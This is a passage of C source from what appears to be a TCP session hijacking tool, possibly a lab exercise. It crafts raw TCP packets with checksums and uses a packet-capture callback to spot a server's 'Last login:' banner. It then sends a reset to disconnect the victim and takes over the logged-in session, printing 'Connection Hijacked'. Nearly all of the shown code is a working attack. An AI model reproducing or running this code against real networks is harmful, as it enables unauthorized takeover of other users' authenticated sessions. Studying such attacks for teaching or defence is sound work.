    tcph->dest = srv_tcphd->dest;
    tcph->seq = srv_tcphd->seq + 1;
    tcph->syn= 0;
    tcph->fin = 0;
    tcph->rst= 0;//RST flag
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->ack_seq = 0;
    tcph->urg=0;
    tcph->window = htons(5840);//Maximum window size allowed
    tcph->doff=5;//TCP header size
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    psh.dest_address = iph->daddr;
    psh.source_address = iph->saddr;
    psh.protocol = 6;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    psh.placeholder = 0;
    
    int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_tcp_header));
    memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr));
    
    tcph->check = checksum( (unsigned short*) pseudogram , psize);
    
    //destination socket
    struct sockaddr_in dest;
    dest.sin_addr.s_addr=iph->daddr;
    dest.sin_family=AF_INET;
    dest.sin_port=tcph->dest;

    //send the rst packet
    if(sendto(fd, packet, iph->tot_len, 0, (const struct  sockaddr *)&dest, sizeof(dest))==-1){
        printf("Unable to send package\n");
    }
	else{
		printf("\nConnection Hijacked, package sent to Server\n");
		//print_tcp_ip_hdr(iph,tcph);
	}
}
//Sees a succesfull login, uses send_rst to the the server and uses send_msg() to reach the server
void find_succes_login(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
	//get ipheader
	struct iphdr *iph;
	iph =  (struct iphdr *)(buffer + sizeof(struct ethhdr));
	int size = header->len;
    size = size - sizeof(struct ethhdr);
	// get tcp header
  	struct tcphdr *tcph = (struct tcphdr *)((uint8_t *)(iph) + 4 * iph->ihl);
  	// get data
	char *dbegin = (char *)(tcph) + 4 * tcph->doff;
  	char *dend = (char *)(iph) + ntohs(iph->tot_len);
  	char *data_s = malloc(dend - dbegin + 1);
  	if (data_s == NULL) puts("Unable to allocate memory");
  	memcpy(data_s, dbegin, dend - dbegin);
  	data_s[dend - dbegin] = '\0';

  	//If we had a succesfull login, we can reset the victim and keep talking to the server
  	if (strncmp(data_s, "Last login:", strlen("Last login:")) == 0) {//The text that is sent by the server if we succesfully login
    	void *aux = malloc(iph->tot_len);
    	if(aux==NULL)
    	  puts("Failed to allocate memory");
    	memcpy(aux,iph,iph->tot_len);
		//1.4 - send the reset to end connection with the victim
		send_rst(iph_server_global,tcph_server_global);//To catch this package we need to look in loopback
		send_msg(iph_client_global, tcph_client_global);
  	}
}